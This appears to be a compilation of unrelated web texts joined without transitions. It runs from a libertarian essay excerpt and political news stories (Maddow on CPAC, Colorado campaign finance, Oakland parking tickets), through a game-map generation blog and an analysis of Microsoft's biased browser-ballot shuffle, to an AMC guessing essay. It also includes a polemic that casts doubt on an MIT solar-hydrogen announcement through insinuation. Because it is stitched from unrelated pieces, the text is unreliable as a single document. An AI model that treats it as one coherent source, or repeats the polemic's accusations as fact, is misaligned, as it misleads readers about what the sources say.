The state has expanded its powers by encouraging the rest of us to divide off from one another into conflicting groups ( e.g. , competing racial , ethnic , gender , religious , economic , etc. , categories ) .
What if we were to rediscover what our distant ancestors knew , namely , that what we have in common is a need for our protection as individuals ?
What if each of us began thinking of wars , taxation , torture , eminent domain , etc. , as attacks by the state upon each of us ?
What if I understood that your being conscripted also enslaved me ; and that I would be prepared to stand by you in peaceful opposition ?
There is a wonderful scene of just such a possibility in the movie Witness .
Set in an Amish community — where people live peaceful , anarchistic , pacifistic , and spiritual lives without any inner political structuring — the villain ( a Philadelphia police official ) arrives to capture the hero ( a police officer who is in hiding ) in order to kill him .
An Amish boy rings the family bell , sending a warning out to all the neighbors who come running in answer to his signal for help .
The villain — the only man who is armed — is completely disarmed ( without being touched ) by some two - dozen pacifist Amish men who stand as " witnesses " to the wrong being perpetrated by the villain .
What might we learn from the example of the Amish — and others — about the peaceful strength that comes from our standing together with one another in a peaceful , moral resolve that says " no more " ?
The Best of Butler Shaffer
MSNBC ’s Rachel Maddow is attending the Conservative Political Action Conference this week and reporting back to the rest of the country on what she described Thursday as “ the biggest single event on the conservative calendar that is not Ronald Reagan ’s birthday . ”
Maddow focused in particular on the numerous Republican politicians who showed up to woo conservative activists , noting wryly that “ their courting of the CPAC audience today did not apparently extend to making sure that what they told that audience was true . ”

Former Massachusetts Governor and 2012 presidential hopeful Mitt Romney was a particular offender in Maddow ’s eyes , and she gleefully tore into his litany of lies and half - truths attacking the Obama administration .
In an attempt to turn the “ Party of No ” label that has clung to Republicans back against the Democrats , Romney proclaimed , “ Let ’s ask the Obama folks why they say ‘ No . ’
No to a balanced budget .
No to reforming entitlements .
No to malpractice reform . ”
“ Do you want to see President Obama saying ‘ No ’ to medical malpractice reform ? ” Maddow asked slyly .
She then played a clip of Obama saying , “ I do n’t believe malpractice reform is a silver bullet , but I ’ve talked to enough doctors to know that defensive medicine may be contributing to unnecessary costs . ”
“ No to tax cuts to create jobs , ” Romney went on .
“ You know that giant stimulus package that had its one - year birthday yesterday ? ” Maddow responded .
“ That was also one of the biggest tax cuts in American history . ”
ADVERTISEMENT
“ Romney was not alone in his insults to his audience ’s intelligence today , ” continued Maddow , as she turned her focus to the charge by Rep.
Thaddeus McCotter ( R - MI ) that “ the Democrats said no ” to “ fiscal integrity and discipline in government spending . ”
Maddow refuted that claim with a chart showing the national debt skyrocketing under both Ronald Reagan and George W. Bush , while growing far more modestly under Carter and Clinton .
Maddow also had fun with former Rep. Dick Armey ’s insistence that the Democrats had invented “ the perception of a crisis ” in health care , “ despite the fact that America has the greatest health care in the world , ” in order to further an agenda “ of controlling the distribution of income in America . ”
“ Do you want to see what that fake crisis looks like ? ” Maddow asked .
“ In 1960 , health care spending was about 5 % of our GDP . …
By last year , our health care spending constituted more than 17 % of our entire economic output as a nation . …
That ’s the crisis President Obama has apparently created out of thin air for his own political gain . ”

Maddow concluded with a final shot at Sen. Jim DeMint ( R - SC ) , who threw what she called “ red meat ” to the crowd by declaring , “ We now see all too clearly that the hope and change the Democrats had in mind was nothing more than a retread of the failed and discredited socialist policies that have been the enemy of freedom for centuries all over the world . ”
“ ‘ The enemy of freedom , ' ” Maddow echoed skeptically .
“ As I said before , CPAC is a big deal .
This is where conservative politicians go to hone their messages , to align themselves with where the modern conservative movement is .
And judging from the speeches at the podium today , the modern conservative movement , at least in the mind of its politicians , is in La La Land . ”

Colorado Republicans will sue to overturn voter - approved state limits on some campaign contributions after a U.S. Supreme Court ruling Thursday that tossed out restrictions on corporate involvement in federal races .
“ Our firm will be bringing a challenge to this law in the coming days , ” said Ryan Call , an attorney with Hale - Friesen .
Call said the firm will represent the Colorado Republican Party in the suit and is trying to put together a cross section of plaintiffs .
“ It will be a broad coalition , ” he said .
“ It will be partisan groups .
It will be trade associations , individual companies and corporations . ”
The Supreme Court threw federal campaign finance into turmoil Thursday with a broad rejection of parts of a 63 - year - old law that prohibited companies and unions from using revenues to run campaigns against or for political candidates .
In 2002 , Colorado voters approved a ballot measure that banned direct corporate or union expenditures in state races .
Given the Supreme Court ’s action Thursday , Colorado Common Cause director Jenny Flanagan said a challenge of the state law was almost inevitable .
“ I think we ’re very vulnerable given the breadth of the court ’s decision today on the corporate issues , ” she said .
“ I absolutely expect it . ”
Common Cause was one of the major sponsors of the 2002 ballot measure .
Call said the lawsuit probably will also challenge other parts of Colorado ’s law , such as the $ 400 limits on donations to state legislative candidates by individuals and political action committees and the creation of small - donor committees that are allowed to contribute 10 times the limit because they get their money from donations of $ 50 or less .
Small - donor committees have been commonly used by labor unions , who use money from union payroll deductions , to make large donations to legislative races .
But Flanagan said overturning the limits and small - donor groups in Colorado would not immediately flow from the Supreme Court ’s decision .
“ It did not address these other issues , ” she said .
“ It ’s not clear in those areas . ”
Colorado Secretary of State Bernie Buescher said he will work with state Attorney General John Suthers to see whether the Colorado finance laws need to be changed by the legislature to conform to the court decision .
The looming lawsuit is one of several aftershocks expected from what politicians and analysts said is a “ landmark ” decision affecting how political campaigns will unfold , starting this year .
It could lead to an autumn barrage of political ads and mailings directly financed by corporations and unions — and out of candidates ’ control .
The decision allows corporations and unions to spend unlimited amounts of money from their treasuries to support or oppose federal candidates all the way through Election Day .
It ’s likely to be a factor in Colorado ’s U.S. Senate race , candidates said .
“ The problem with this decision is it gives each candidate less control over their own race and gives outside groups more control , ” said Craig Hughes , campaign manager for Democratic Sen. Michael Bennet .
Cinamon Watson , spokesperson for Republican U.S. Senate candidate Jane Norton , said the campaign expects to see more money from outside interests this year .
“ It ’s going to be a fight to the finish , ” Watson said .
Former state House Speaker Andrew Romanoff , who is challenging Bennet for the Democratic nomination , said the ruling “ opened the floodgates for billions more ” in special - interest money .
But Mark Grueskin , a leading election - law specialist at Isaacson Rosenbaum , said it remains to be seen if the decision leads to a torrent of corporate and labor spending in political races here .
The economy is down , attention will be focused on three ballot measures to limit state government spending , and corporations and interest groups will need to be careful about the political messages they attach their names to , Grueskin said .
“ It ’s a risk - laden strategy , ” he said .

Update [ 2016 ]
I have an updated interactive version of this technique here , with sample code .
My friends Alex and Rob at Wild Shadow Studios entered the TIG Assemblee competition .
In the first 30 days , artists create art assets , and in the second 30 days , programmers create games with those assets .
Alex and Rob decided to write an MMO in those 30 days .
They asked me about generating game maps .
In the past I had generated outdoor terrain maps by using randomness , erosion , and water flow ( see the Simblob Project ) .
However there was a terrible trap in there .
I spent years refining the terrain generation system , and far too little time working on combat and the game itself .
I had fun , but I never finished that game .
Wary of my tendencies to work on one aspect of a game too much while neglecting everything else , I decided this time to do something simple .
I started with Perlin Noise .
I generated both a moisture map and an altitude map :
To ensure that some areas are dry and some areas are wet , I renormalized the moisture map to try to produce equal areas of every moisture level .
I also renormalized the altitude map to produce far more flat and low lands than high altitudes , following a quadratic function .
After renormalization every random map has a reasonable mix of land types .
From these I defined simple rules that assigned a vegetation .
High altitudes are snowy mountaintops and low altitudes are ocean or beach .
In between , the moisture determines how green or yellow the land is .
Since most altitudes are not reflected in the map coloring , I added some shading so that it would be easier to see the mountains and valleys :
There were two things I wanted to add .
The first was noise .
I find noise to add to the visual appeal , and in this case it would also decrease the sharp boundaries between different terrain types .
Compare this map to the original :
The second thing I wanted to add was wind .
In many parts of the world , wind picks up moisture from the ocean and spreads it over the land .
At mountains , much of this moisture is extracted from the wind and dropped as rain :
You can see this pattern in the United States , with winds out of the west dropping moisture in Oregon and California , passing over the Sierra Nevada mountains , leaving Utah and Arizona rather dry .
In Australia , the winds come from the east , hit the Great Dividing Range , leaving the eastern coast wet and the interior of the continent dry .
In South America , the winds come from the east but do n't hit mountains until the Andes , so the rain falls over most of the continent , giving us the Amazon rainforest .
I wanted the mountains in the game map to affect the moisture levels .
I added a wind algorithm that spreads moisture from west to east and generated this map :
You can see that the dry areas in the northwest are now green , and the southeast , where the moisture is blocked by mountains , is dry .
It seems more “ realistic ” but I think the players do n't really notice such things .
In the demo app you can click on the minimap to see the zoomed area , change the number of wind algorithm iterations ( then press Update ) , randomize the map seed ( the Randomize button ) , or type in a random number seed and press Update .
I find that 83980 , 59695 , 94400 , 92697 , 30628 , 9146 , 23896 , 60489 , 57078 , 89680 , 10377 , 42612 , and 29732 are seeds that produce decent maps .
The demo differs a little bit from what we used in the game but the overall map shape and features are the same .
For Realm of the Mad God we exported the map and then made vegetation and monsters based on the terrain characterstics .
The tree density was higher in jungles than on hills , rocks mostly were on mountains , and dead trees littered the deserts .
Monsters too were terrain - specific at first , but they ended up spreading throughout the land .
On top of the map we added random temple ruins and were hoping to make those areas special in some way , but ran out of time .
Looking back on this project , there were lots of things I did that do n't really matter to the players .
I tried to make the algorithms “ scale independent ” so that I could generate maps of different sizes and they 'd end up with similar features , but in practice we only wanted maps of 2048x2048 .
The noise , which looks good in the overview map , looks awful when playing the game , so we ended up smoothing it out .
I tried to make a two - step process that would generate the large scale features with one algorithm and the details with a different algorithm , and I never got that working well ; I ended up just generating everything with the large scale algorithm .
I had a river algorithm that carved out canyons , and I did n't get it working well enough in time for the game contest .
I tried several ways to make the edges of the map into oceans ( so that players would never reach the edge of the map ) but none of them worked out , and players did n't seem to mind reaching the edge .
The edges of the map never worked out right because bands of weirdness would form ( you can see this in the demo ) .
The simplest thing would 've been to cut off the edges .
There were also lots of things I 'd like to add , but probably should n't because I should move on to other projects .
It would 've been nice to create a map rating algorithm that could automatically pick out maps that look good ( plenty of water , beach , mountains , variety , etc. ) .
But for Realm of the Mad God we just looked at a bunch of maps and picked seed 72689 .
It was a pretty nice looking map , except the peninsula turned out to be a little frustrating for players , and we do n't want the bosses to spawn on islands that players can't reach .
For the expansion pack we 'll probably just pick a few random seeds that look good and make maps from them .
It would 've been nice to automatically pick spawn points for players and monsters but those too were just placed manually .
It would also be nice if there were some landmarks and regions with names so that the players could talk about where they were .
Try the game and see how different it feels to be exploring the map in the game than it does to look at it in the demo app .
For example , the god monsters live on the mountains ; it 's much easier to see where these are on the map than to figure it out while playing the game .
I think the 30 day time limit really helped keep me focused on things that would be useful for players .
After the contest was over I found I was spending time on much less important things .
I 'm planning to stop working on the map generator for now , and only revisit it if there are specific features I need to add .

March 6th Update : Microsoft appears to have updated the www.browserchoice.eu website and corrected the error I describe in this post .
More details on the fix can be found in The New & Improved Microsoft Shuffle .
However , I think you will still find the following analysis interesting .
- Rob
Introduction
The story first hit in last week on the Slovakian tech site DSL.sk .
Since I am not linguistically equipped to follow the Slovakian tech scene , I did n’t hear about the story until it was brought up in English on TechCrunch .
The gist of these reports is this : DSL.sk did a test of the “ ballot ” screen at www.browserchoice.eu, used in Microsoft Windows 7 to prompt the user to install a browser .
It was a Microsoft concession to the EU , to provide a randomized ballot screen for users to select a browser .
However , the DSL.sk test suggested that the ordering of the browsers was far from random .
But this was n’t a simple case of Internet Explorer showing up more in the first position .
The non-randomness was pronounced , but more complicated .
For example , Chrome was more likely to show up in one of the first 3 positions .
And Internet Explorer showed up 50 % of the time in the last position .
This is n’t just a minor case of it being slightly random .
Try this test yourself : Load www.browserchoice.eu, in Internet Explorer , and press refresh 20 times .
Count how many times the Internet Explorer choice is on the far right .
Can this be right ?
The DLS.sk findings have lead to various theories , made on the likely mistaken theory that this is an intentional non-randomness .
Does Microsoft have secret research showing that the 5th position is actually chosen more often ?
Is the Internet Explorer random number generator not random ?
There were also comments asserting that the tests proved nothing , and the results were just chance , and others saying that the results are expected to be non-random because computers can only make pseudo - random numbers , not genuinely random numbers .
Maybe there was cogent technical analysis of this issue posted someplace , but if there was , I could not find it .
So I ’m providing my own analysis here , a little statistics and a little algorithms 101 .
I ’ll tell you what went wrong , and how Microsoft can fix it .
In the end it is a rookie mistake in the code , but it is an interesting mistake that we can learn from , so I ’ll examine it in some depth .
Are the results random ?
The ordering of the browser choices is determined by JavaScript code on the BrowserChoice .eu web site .
You can see the core function in the GenerateBrowserOrder function .
I took that function and supporting functions , put it into my own HTML file , added some test driver code and ran it for 10,000 iterations on Internet Explorer .
The results are as follows :
Internet Explorer raw counts Position I.E. Firefox Opera Chrome Safari 1 1304 2099 2132 2595 1870 2 1325 2161 2036 2565 1913 3 1105 2244 1374 3679 1598 4 1232 2248 1916 590 4014 5 5034 1248 2542 571 605
Internet Explorer fraction of total Position I.E. Firefox Opera Chrome Safari 1 0.1304 0.2099 0.2132 0.2595 0.1870 2 0.1325 0.2161 0.2036 0.2565 0.1913 3 0.1105 0.2244 0.1374 0.3679 0.1598 4 0.1232 0.2248 0.1916 0.0590 0.4014 5 0.5034 0.1248 0.2542 0.0571 0.0605
This confirms the DSL.sk results .
Chrome appears more often in one of the first 3 positions and I.E. is most likely to be in the 5th position .
You can also see this graphically in a 3D bar chart :
But is this a statistically significant result ?
I think most of us have an intuitive feeling that results are more significant if many tests are run , and if the results also vary much from an even distribution of positions .
On the other hand , we also know that a finite run of even a perfectly random algorithm will not give a perfectly uniform distribution .
It would be quite unusual if every cell in the above table was exactly 2,000 .
This is not a question one answers with debate .
To go beyond intuition you need to perform a statistical test .
In this case , a good test is Pearson ’s Chi-square test , which tests how well observed results match a specified distribution .
In this test we assume the null - hypothesis that the observed data is taken from a uniform distribution .
The test then tells us the probability that the observed results can be explained by chance .
In other words , what is the probability that the difference between observation and a uniform distribution was just the luck of the draw ?
If that probability is very small , say less than 1 % , then we can say with high confidence , say 99 % confidence , that the positions are not uniformly distributed .
However , if the test returns a larger number , then we cannot disprove our null - hypothesis .
That does n’t mean the null - hypothesis is true .
It just means we ca n’t disprove it .
In the end we can never prove the null hypothesis .
We can only try to disprove it .
Note also that having a uniform distribution is not the same as having uniformly distributed random positions .
There are ways of getting a uniform distribution that are not random , for example , by treating the order as a circular buffer and rotating through the list on each invocation .
Whether or not randomization is needed is ultimately dictated by the architectural assumptions of your application .
If you determine the order on a central server and then serve out that order on each innovation , then you can use non-random solutions , like the rotating circular buffer .
But if the ordering is determined independently on each client , for each invocation , then you need some source of randomness on each client to achieve a uniform distribution overall .
But regardless of how you attempt to achieve a uniform distribution the way to test it is the same , using the Chi-square test .
Using the open source statistical package R , I ran the chisq.test ( ) routine on the above data .
The results are :
X-squared = 13340.23 , df = 16 , p-value < 2.2e - 16
The p-value is much , much less than 1 % .
So , we can say with high confidence that the results are not random .
Repeating the same test on Firefox is also non-random , but in a different way :
Firefox raw counts Position I.E. Firefox Opera Chrome Safari 1 2494 2489 1612 947 2458 2 2892 2820 1909 1111 1268 3 2398 2435 2643 1891 633 4 1628 1638 2632 3779 323 5 588 618 1204 2272 5318
Firefox fraction of total Position I.E. Firefox Opera Chrome Safari 1 0.2494 0.2489 0.1612 0.0947 0.2458 2 0.2892 0.2820 0.1909 0.1111 0.1268 3 0.2398 0.2435 0.2643 0.1891 0.0633 4 0.1628 0.1638 0.2632 0.3779 0.0323 5 0.0588 0.0618 0.1204 0.2272 0.5318
On Firefox , Internet Explorer is more frequently in one of the first 3 positions , while Safari is most often in last position .
Strange .
The same code , but vastly different results .
The results here are also highly significant :
X-squared = 14831.41 , df = 16 , p-value < 2.2e - 16
So given the above , we know two things :
1 ) The problem is real .
2 ) The problem is not related to a flaw only in Internet Explorer .
In the next section we look at the algorithm and show what the real problem is , and how to fix it .
Random shuffles
The browser choice screen requires what we call a “ random shuffle ” .
You start with an array of values and return those same values , but in a randomized order .
This computational problem has been known since the earliest days of computing .
There are 4 well - known approaches : 2 good solutions , 1 acceptable ( “ good enough ” ) solution that is slower than necessary , and 1 bad approach that does n’t really work .
Microsoft appears to have picked the bad approach .
But I do not believe there is some nefarious intent to this bug .
It is more in the nature of a “ naive ” algorithm ” , like the bubble sort , that inexperienced programmers inevitably will fall upon when solving a given problem .
I bet if we gave this same problem to 100 freshmen computer science majors , at least one of them would make the same mistake .
But with education and experience , one learns about these things .
And one of the things one learns early on is to reach for Knuth .
The Art of Computer Programming , Vol. 2 , section 3.4.2 “ Random sampling and shuffling ” describes two solutions :
If the number of items to sort is small , then simply put all possible orderings in a table and select one ordering at random .
In our case , with 5 browsers , the table would need 5 ! = 120 rows .
“ Algorithm P ” which Knuth attributes to Moses and Oakford ( 1963 ) , but is now known to have been anticipated by Fisher and Yates ( 1938 ) so it is now called the Fisher - Yates Shuffle .
Another solution , one I use when I need a random shuffle in a database or spreadsheet , is to add a new column , fill that column with random numbers and then sort by that column .
This is very easy to implement in those environments .
However , sorting is an O ( N log N ) operation where the Fisher - Yates algorithm is O ( N ) , so you need to keep that in mind if performance is critical .
Microsoft used none of these well - known solutions in their random solution .
Instead they fell for the well - known trap .
What they did is sort the array , but with a custom - defined comparison function or “ comparator ” .
JavaScript , like many other programming languages , allows a custom comparator function to be specified .
In the case of JavaScript , this function takes two indexes into the value array and returns a value which is :
< 0 if the value at the first index should be sorted before the value at the second index
0 if the values at the first index and the second index are equal , which is to say you are indifferent as to what order they are sorted
> 0 if the value at the first index should be sorted after the value at the second index
This is a very flexible approach , and allows the programmer to handle all sorts of sorting tasks , from making case - insensitive sorts to defining locale - specific collation orders , etc . .
In this case Microsoft gave the following comparison function :
function RandomSort ( a , b ) { return ( 0.5 - Math.random ( ) ) ; }
Since Math.random ( ) should return a random number chosen uniformly between 0 and 1 , the RandomSort ( ) function will return a random value between - 0.5 and 0.5 .
If you know anything about sorting , you can see the problem here .
Sorting requires a self - consistent definition of ordering .
The following assertions must be true if sorting is to make any sense at all :
If a<b then b>a
If a>b then b<a If a=b then b=a if a <b and b<c then a <c If a>b and b>c then a>c
If a=b and b=c then a=c
All of these statements are violated by the Microsoft comparison function .
Since the comparison function returns random results , a sort routine that depends on any of these logical implications would receive inconsistent information regarding the progress of the sort .
Given that , the fact that the results were non-random is hardly surprising .
Depending on the exact search algorithm used , it may just do a few exchanges operations and then prematurely stop .
Or , it could be worse .
It could lead to an infinite loop .
Fixing the Microsoft Shuffle
The simplest approach is to adopt a well - known and respected algorithm like the Fisher - Yates Shuffle , which has been known since 1938 .
I tested with that algorithm , using a JavaScript implementation taken from the Fisher - Yates Wikpedia page , with the following results for 10,000 iterations in Internet Explorer :
Internet Explorer raw counts Position I.E. Firefox Opera Chrome Safari 1 2023 1996 2007 1944 2030 2 1906 2052 1986 2036 2020 3 2023 1988 1981 1984 2024 4 2065 1985 1934 2019 1997 5 1983 1979 2092 2017 1929
Internet Explorer fraction of total Position I.E. Firefox Opera Chrome Safari 1 0.2023 0.1996 0.2007 0.1944 0.2030 2 0.1906 0.2052 0.1986 0.2036 0.2020 3 0.2023 0.1988 0.1981 0.1984 0.2024 4 0.2065 0.1985 0.1934 0.2019 0.1997 5 0.1983 0.1979 0.2092 0.2017 0.1929
Applying Pearson ’s Chi-square test we see :
X-squared = 21.814 , df = 16 , p-value = 0.1493
In other words , these results are not significantly different than a truly random distribution of positions .
This is good .
This is what we want to see .
Here it is , in graphical form , to the same scale as the “ Microsoft Shuffle ” chart earlier :
Summary
The lesson here is that getting randomness on a computer cannot be left to chance .
You can not just throw Math.random ( ) at a problem and stir the pot , and expect good results .
Random is not the same as being casual .
Getting random results on a deterministic computer is one of the hardest things you can do with a computer and requires deliberate effort , including avoiding known traps .
But it also requires testing .
Where serious money is on the line , such as with online gambling sites , random number generators and shuffling algorithms are audited , tested and subject to inspection .
I suspect that the stakes involved in the browser market are no less significant .
Although I commend DSL.sk for finding this issue in the first place , I am astonished that the bug got as far as it did .
This should have been caught far earlier , by Microsoft , before this ballot screen was ever made public .
And if the EC is not already demanding a periodic audit of the aggregate browser presentation orderings , I think that would be a prudent thing to do .
If anyone is interested , you can take a look at the file I used for running the tests .
You type in an iteration count and press the execute button .
After a ( hopefully ) short delay you will get a table of results , using the Microsoft Shuffle as well as the Fisher - Yates Shuffle .
With 10,000 iterations you will get results in around 5 seconds .
Since all execution is in the browser , use larger numbers at your own risk .
At some large value you will presumably run out of memory , time out , hang , or otherwise get an unsatisfactory experience .

Suspected anomalies discovered in article published at MIT News : ” Major Discovery from MIT is
primed to unleash a Solar Revolution ! “
The ongoing , yet destructively repressed and polarized , debates between so called Climate Skeptics ( and their ilk ) VS .
the popular proponents of Anthropogenic Global Warming ( AGW ) may have cooled slightly in the post -Copenhagen lull .
But questions around the scope of Scientific Method employed in determining AGW , are only now beginning to rise to the forefront of Public Consciousness .
The primary question has been to wonder if it ’s indeed possible for ‘ pure science ’ ( at least at the educational research level ) to be bent or distorted in order to serve pre-ordained objectives .
So can science be bent around the points of peerage that are always subject to new review ( according to said Method ) , to instead selectively support current states of research .
In effect whatever specific agendas , that might tap into otherwise unavailable funding , or even simply to act as a public relations tool – in service of much larger visibility campaigns ?
If we can possibly leave aside ( just for now ) the temporarily cooled question of Climate Change , we could look for signs of all of the above in a surprisingly exuberant article published on the MIT News site in July 2008 instead of wondering if science is above promoting itself for the sake of funding or notoriety .
Even though it ’s exultant title wildly proclaims that a “ Major Discovery from MIT is primed to unleash a Solar Revolution ” !
the hard science and empirical data or comparative results behind the article are thinly presented ( at least from the Layman ’s POV ) , and there still does n’t seem to be much obvious evidence of wider public discourse or a proper ‘ peer review ’ process around this “ major discovery ” either .
Perhaps this is just the style employed for wider press releases via “ MIT News ” , however one would at least expect to see evidence of published papers / results , or at least links to some shared or foundation research .
Perhaps MIT is operating under the principals of private enterprise , and it would n’t want to jeopardize plans to commercialize it ’s discovery by giving away any un-patented trade secrets .
That last possibility would indicate that we ’ve already seriously diverged out of the field of publicly funded research , and into corporately ( privately ? ) held intellectual property .
Perhaps someone could clarify the business model that supports MIT , or other such institutions to dispel any such naivete that could be evidenced here .
In any case , let ’s try to leave commercial interests aside , and get back to some hard Science .
Curiously this “ Major Discovery ” seems to have created barely more than a ripple in it ’s own Comments section at MIT News to date , let alone setting off the kind of Media feeding frenzy that such a title would suggest is in the offering from such an otherwise reputable and prestigious source of Science News .
Perhaps there is more ( or less ) to this discovery than meets the eye , so let ’s review …
First of all the entire premise of this discovery is that solar energy can be stored as Hydrogen ( H ) according to the “ lesson to be learned from nature ” .
As Daniel Nocera ( Chem . Prof. ) condescends , ” There ’s all those little green things out there called leaves ” .
He then goes on to describe what is essentially then same process of electrolysis that some might remember from HighSchool , which is apparently only different in his work at MIT in that there is now a mysterious “ catalyst ” that allows you to make Hydrogen ( H ) and Oxygen ( O ) from water !
Instead , the bulk of this presentation in fact focuses on the incredible ability to now store solar energy as hydrogen right in the home … Starting with the photovoltaic panels required to produce the required electricity in this “ breakthough ” process which has been repeatedly alluded to as being inspired by photosynthesis , but yet which bears almost no resemblance at all to the ( mainly ) chlorophyll based processes found in plants .
It ’s hard to say how this claim factors into the “ science ” being presented here , nor what efficiencies have been discovered over normal electrolysis ( presumably ) , since there is n’t a comparative number in sight , and since thermodynamic equations appear to be a non-issue , and finally we are left to presume that full disclosure of net energy consumption / production within this “ breakthrough would likely ruin an otherwise compelling story .
Which all leads us to think that this might be nothing more than a PR campaign for demonstrating how energy can be converted and stored via alternate processes .
Processes which of course have yet to be proven efficient enough to develop any further as it would seem by the date of release , without current updates .
So if Mr. Nocera has indeed cracked the secret of photosynthesis , why is n’t his demonstration happening outside in the sun , rather than inside a beaker setup for electrolysis … being run at the end of an electrical lead from another standard PV cell ?
Why did n’t MIT claim to have figured out how to ( uhm ) create energy from wind , and then bubble off hydrogen at some mysteriously composed metallic cathode ( powered by a wind turbine of course ) as proof that they can generate electrical charge in the same manner as the atmosphere does !?!
Would n’t that have been an equally preposterous leap in logic to promote to the general public ?
Mr. Nocera goes to great length to describe the many benefits off producing hydrogen right in the home ( without any concerns for safe storage of course ) but only momentarily describes his actual and critical process and glosses over the critical point as being enabled by “ our catalyst to break up water and hydrogen ” .
Does anyone else sense some slight of hand in this presentation by MIT News ?
The only remotely groundbreaking possibility here is that this “ catalyst ” which is quickly referred to as a composition of cobalt and phosphate is what is allegedly inspired by photosynthesis , yet which does n’t employ a photocell in it ’s actual process , but rather as a simple / generic course of free electrons and voltage .
Since we ’re clearly dealing with electrolysis , and not photosynthesis , let ’s clarify that Cobalt is already known to improve the efficiency of electrolysis , however it also collects on the cathode and results in an electroplated element that needs to be replaced very regularly .
So where else the new efficiencies in this breakthrough described ?
Should n’t a news release from MIT contain some actual Science ?
Should n’t a Chemistry professor have at least one comment to add about ( perhaps ) organic chemistry , or chloroplasts , or perhaps some other bio-chemical process that could be at play here in an attempt to at least TRY and tie this concept in solar based energy back to the sun somehow ?
Essentially , where ’s the correlation with photosynthesis in what appears to be electrolysis !?!
Perhaps this “ breakthrough ” is a virtual one ?
Perhaps the “ science ” that Nocera is engaged in here is merely a subset of Social Science , where average Laymen is suddenly able to see energy production and storage in an entirely new light , thanks to Nocera ’s “ breakthrough ” .
Does this seem like a more appropriate context for such an active publicity campaign ?
Could MIT
News be actually more concerned about the science behind propaganda and the formation of public opinion ?
It ’s interesting to note that in the following segment with Harvard Physicist Eric Mazur , he at least points out the folly of trying to store that much hydrogen in your home , and the clear inefficiency of photovoltaic power that still need to be overcome …
Though in a rather unscientific manner , he still describes the discovery as a ” convenient and magical way to store hydrogen ” .
This is hardly the language one would expect from a Scientist being quoted in a 15 second spot of limelight .
Moving right along though …
Why does Nocera keep right on talking about converting solar energy according to photosynthesis , when it ’s abundantly clear that he ’s using Photovoltaics ( PV ) to generate the electricity for what seems to be a curiously undescribed and only slight modification to basic electrolysis ?
Why does the presentation dwell upon Hydrogen as a storage medium , rather than substantiate the central claim ?
In the end we have what appears to be a blatant attempt by a very reputable institution to cajol the public into believing that the complexity of photosynthesis has somehow been harnessed , and will now ‘ revolutionize the solar industry ’
… Since this discover “ opens the door to large scale solar because it offers an easy way to store hydrogen ”
The lasting image that we ’re left with is of a rather self - rightous Nocera making one last bold claim that is likely to also have nothing to do with the Reality of the situation , and simply further emphasizes how corruptible the Science at MIT may have become .
As he holds a green leaf in his hand he states : “ I own you …I can finally do what you do …and if that does n’t get you excited then do n’t do Science ”
At least do n’t “ do science ” without openly disclosed facts , and for the sake of generating PR value at least …
That ’s for sure .

Oakland parking officers were ordered to avoid enforcing neighborhood parking violations in two of the city 's wealthier neighborhoods but told to continue enforcing the same violations in the rest of the city , according to a city memo obtained by The Chronicle .
The July order is corroborated by interviews with three parking officers , who said they and their colleagues had complained about what they deemed a discriminatory practice since it began last summer - to no avail .
" It 's not fair , " said Shirnell Smith , 44 , a parking officer for 22 years who has lived in Oakland for 24 years .
Smith and the union representing parking officers said the policy has resulted in tickets being issued disproportionately to poor , black and Latino people .
The accusations cast a new light on one of Oakland 's most contentious issues during the past year .
Desperate for new revenue in a faltering economy , the City Council in June increased parking fines , meter rates , hours of enforcement and enforcement in neighborhoods .
The parking department created a new work shift to ticket neighborhoods at night .
As part of that enforcement , parking officers ticketed residents for violations that had been a way of life for decades .
The most controversial tickets in residential neighborhoods were issued for parking on sidewalks and parking in the wrong direction .
Residents told the city and The Chronicle that some streets are so narrow that emergency vehicles cannot get through unless they park like that .
Under pressure from businesses that complained the new parking rules were keeping customers away , the council in October rescinded only the meter enforcement from 6 p.m. to 8 p.m. , but left other elements in place .
However , unknown at the time , the parking department had deemed certain tony neighborhoods - Montclair and Broadway Terrace - off - limits from those two parking infractions .
Parking violators in those neighborhoods were to receive " courtesy notices , " according to a July 24 memo by Ronald Abernathy , a senior parking enforcement supervisor , sent to four parking supervisors and copied to parking Director Noel Pinto .
The letter did not explain why the two neighborhoods were being spared from the tickets , which carry fines ranging from $ 40 to $ 100 .
Reached on his personal cell phone Wednesday , Abernathy would only say , " I do n't answer any media questions . "
Numerous calls and e-mails to Pinto and City Administrator Dan Lindheim on Wednesday were not returned .
More narrow streets
On Outlook Avenue in East Oakland , residents told The Chronicle that parking officers blanketed a four - block stretch late last year .
The streets are narrow there , too , as they are in Montclair .
Luther Couch , 43 , has lived on the block for 41 years .
He said that nearly everyone on his block has been sideswiped , so parking on the sidewalk is a must .
Nonetheless , he got a $ 100 ticket late last year for parking on the sidewalk .
Doing one thing in Broadway Terrace and another in East Oakland is wrong , he said .
" To me , it 's a double standard :
The higher up you live and the more clout you think you have , they do n't ticket you and sweep it under the rug , " he said .
The three parking officers who spoke to The Chronicle said their internal complaints have gone nowhere , so they decided to make the issue public .
They are doing so with the support of their union , SEIU Local 1021 , which is holding a noon rally on the issue today in front of City Hall .
Risky move
The officers said voicing complaints is risky for most night - shift workers because they are part - timers who can be fired at - will .
" I have absolutely no rights within the city , " said a part - time officer who asked to remain anonymous .
" It 's not right for us to only ticket in certain areas .
The city of Oakland is one city . "
Smith , a parking officer who works full - time and has union protection , said that part of the reason there was a desire to speak out was that parking officers have been harassed by citizens aware of the practice of not ticketing certain neighborhoods .
Smith said the officers have complied with the rule despite their disagreement with it .
" We 're the only ones out there in the field dealing with this , " said the third officer who also feared being named .
" There are a lot of inconsistencies . "
Smith said administrators need to be held accountable .
" We 're taking the brunt of citizens ' grief on this , " said Smith .
" Everyone needs to know this is happening . "

I promised to discuss how to improve the accuracy of your guessing at AMC 10 / 12 , or other tests for that matter .
There are two types of guessing .
First , meta - guessing is when you do not look at the problem , but rather guess from just looking at the choices .
Second , in the one I refer to as an educated - guess you do look at the problem .
Instead of completely solving it , you try to deduce some information from the problem that will help you eliminate some of the choices .
In this essay , I discuss both methods .
But first let me emphasize that solving problems is a more important skill than meta - guessing from a list of choices .
Solving problems not only teaches you to think mathematically , but also increases your brain power .
Spending time improving your meta - guessing skills can help you at multiple - choice tests and may give you insight into how test designers think , but this will not increase your math knowledge in the long run .
On the other hand , educated - guessing is a very useful skill to obtain .
Not only can it improve your score during a test , the same methods can be applied to speed up the process of re-checking your answers before handing in the test .
This skill will also come in handy when you start your research .
Some problems in research are so difficult that even minor progress in estimating or describing your answer is beneficial .
Before discussing particular methods , let me remind you that AMC 10 / 12 is a multiple - choice competition with five choices for each question .
The correct answer brings you 6 points .
A wrong answer brings you 0 points , and not answering brings you 1.5 points .
